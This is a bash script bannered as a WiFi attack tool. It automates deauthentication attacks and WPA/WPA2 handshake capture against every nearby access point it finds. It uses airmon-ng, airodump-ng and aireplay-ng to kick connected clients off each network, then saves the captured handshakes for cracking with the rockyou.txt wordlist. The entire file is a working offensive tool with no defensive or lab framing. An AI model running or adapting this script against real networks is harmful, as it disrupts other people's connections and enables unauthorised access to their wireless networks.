#!/bin/bash

#initialisation

#interface=$(ip a | grep wl | cut -d ":" -f2)

clear
#Colors setting
BLUE='\033[0;36m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YLOW='\033[0;33m'
EC='\033[0m'
bold=$(tput bold)

echo -e "${BLUE}${bold}                                                                                                                   "
echo "         __      __._____________.__     ________________________________  _________  ____  __.                      "
echo "        /  \    /  \__\_   _____/|__|   /  _  \__    ___/\__    ___/  _  \ \_   ___ \|    |/ _|                      "
echo "        \   \/\/   /  ||    __)  |  |  /  /_\  \|    |     |    | /  /_\  \/    \  \/|      <                        "
echo "         \        /|  ||     \   |  | /    |    \    |     |    |/    |    \     \___|    |  \                       "
echo "          \__/\  / |__|\___  /   |__| \____|__  /____|     |____|\____|__  /\______  /____|__ \                      "
echo "               \/          \/                 \/                         \/        \/        \/                      "
echo "                                                                                                                     "
echo "                                                                                                                     "
echo "  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ "
echo " /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ "
echo "                                                                                                                     "
echo "                                                                                                                     "
echo "________                   __                       .__                  __      ____________  _____                 "
echo "\______ \   ____   _______/  |________  ____ ___.__.|__| ____    ____   /  \    /  \______   \/  _  \                "
echo " |    |  \_/ __ \ /  ___/\   __\_  __ \/  _ <   |  ||  |/    \  / ___\  \   \/\/   /|     ___/  /_\  \               "
echo " |        \  ___/ \___ \  |  |  |  | \(  <_> )___  ||  |   |  \/ /_/  >  \        / |    |  /    |    \              "
echo "/_______  /\___  >____  > |__|  |__|   \____// ____||__|___|  /\___  /    \__/\  /  |____|  \____|__  /  /\  /\  /\  "
echo "        \/     \/     \/                     \/             \//_____/          \/                   \/   \/  \/  \/  "
echo -e "                                                                                                            ${EC}    "

sleep 3

#Delete old file
rm -f xtr* ttr* > /dev/null 2>&1

dictionnary_path="rockyou.txt"
interface="wlan0"

sudo airmon-ng check kill > /dev/null 2>&1
sudo ifdown $interface > /dev/null 2>&1
sudo iwconfig $interface mode monitor > /dev/null 2>&1
sudo ifup $interface > /dev/null 2>&1

time_out=10
Scan_all_AP="sudo airodump-ng --encrypt wpa wlan0 --output-format csv -w xtr --ignore-negative-one"
expect -c "set echo \"-noecho\";
set timeout $time_out;
spawn -noecho $Scan_all_AP;
expect timeout { exit 1 } eof { exit 0 }"
echo "$(tail -n +3 xtr-01.csv)" > ListeAP

clear

cat ListeAP | while read APinfo

do
	BSSID=`echo $APinfo | cut -d ',' -f 1`
	KEY=`echo $APinfo | cut -d ',' -f 6 | tr -d ' '`
	ESSID=`echo $APinfo | cut -d ',' -f 14 | tr -d ' '`
	CANAL=`echo $APinfo | cut -d ',' -f 4`

case $KEY in

	"WPA"|"WPA2")
	clear
	echo -e "${YLOW}${bold}Le réseau $ESSID est protégé par une clé $KEY.\n${EC}"
	sleep 2
	rm -f ttr* > /dev/null 2>&1
	timeout=10
	Scan_specific_AP="sudo airodump-ng --output-format csv -c $CANAL --bssid $BSSID wlan0 -w ttr --ignore-negative-one"
	expect -c "set echo \"-noecho\";
	set timeout $timeout;
	spawn -noecho $Scan_specific_AP;
	expect timeout { exit 1 } eof { exit 0 }"
	echo "$(tail -n +6 ttr-01.csv)" > SpecificAP
	cat SpecificAP | while read APinfo
	do
		STATION=`echo $APinfo | cut -d ',' -f 1`
		grep -q '[^[:space:]]' < SpecificAP
		case $? in
			0)clear
			  echo -e "${GREEN}${bold}Station detected${EC}"
                          sleep 3
			  rm -f azoo*
			  clear
			  time_out=20
			  Scan_single_AP="sudo airodump-ng -c $CANAL $interface --bssid $BSSID -w azoo --output-format cap --ignore-negative-one"
			  #xterm -hold -e "python scapy_Deauth.py $BSSID $STATION wlan0 100 && pkill xterm" &
			  xterm -hold -e "sudo aireplay-ng -0 5 -a $BSSID wlan0 && pkill -n xterm" &
			  expect -c "set echo \"-noecho\";
			  set timeout $time_out;
			  spawn -noecho $Scan_single_AP;
	 		  expect timeout { exit 1 } eof { exit 0 }"
			  clear
		          echo -e "${YLOW}check if captured file contain handshake ...${EC}"
		          sleep 2
				  sudo aircrack-ng azoo-01.cap | grep "WPA (1 handshake)"
			  case $? in
			   1)clear 
				echo -e "${RED}${bold}No handshake captured from $STATION connected to $ESSID${EC}"
                             sleep 2
                             rm -f azoo* > /dev/null 2>&1
           	  ;;
			  0)clear
				echo -e "${GREEN}${bold}Handshake captured successfully${EC}"
			    sleep 3
                mkdir -p Handshakes
				cd Handshakes
				mkdir -p $ESSID
                cd $ESSID
                cp ../../azoo-01.cap handshake_ok.cap
			    echo -e "${GREEN}${bold}Handshake save ready to be cracked ^^${EC}"
			    sleep 2
			    cd ../..
			    break
			  ;;
			  esac
			;;
			1)echo -e "${RED}${bold}No Stations are connected to $ESSID, unable to perform $KEY attack \n-> go to the next AP ...${EC}"
                  	  sleep 2
                          break
                        ;;
                     	esac
        	    done
             	    ;;
	       esac
           done

	
